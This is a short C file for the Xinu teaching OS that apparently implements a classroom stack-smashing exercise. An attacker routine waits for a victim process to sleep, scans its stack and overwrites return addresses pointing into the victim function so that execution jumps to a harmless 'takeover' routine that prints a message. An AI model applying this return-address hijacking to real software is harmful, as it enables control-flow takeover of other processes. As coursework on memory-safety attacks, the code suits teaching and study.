#include<xinu.h>

extern pid32 victimpid;
void takeover();
void stacksmashV();
pid32 victimpid;

void rec(int n) {
    if (n == 1) return;
    rec(n-1);
}

void stacksmashA() {
    while ( proctab[victimpid].prstate != PR_SLEEP ) {
    	sleepms(1);
    }
    
    //kprintf("victim sleep\n");
    uint32 ebp, esp;
    asm("movl %%ebp, %0\n\tmovl %%esp, %1":"=r" (ebp), "=r" (esp));
    //kprintf("A: ebp %08X, esp %08X\n", ebp, esp);
    
    int i;
    for (i = ebp+1024-esp; i <= ebp+2048-esp; i++) {
    	//kprintf("check %08X, i = %d\n", (esp-i),i);
    	if ((uint32)(* (uint32*) (esp-i)) > (uint32) stacksmashV && (uint32)(* (uint32*) (esp-i)) < ((uint32) stacksmashV) + 500) {
	        //kprintf("TRUE, %08X, %08X\n", (*(uint32*)(esp-i)), (uint32)stacksmashV );
		* (uint32*) (esp-i) = (uint32) takeover;
	}
    }
}

void takeover(void) {
    int i;
    for (i = 0; i < 6; i++)
    	kprintf("takeover succeeded.\n");
}
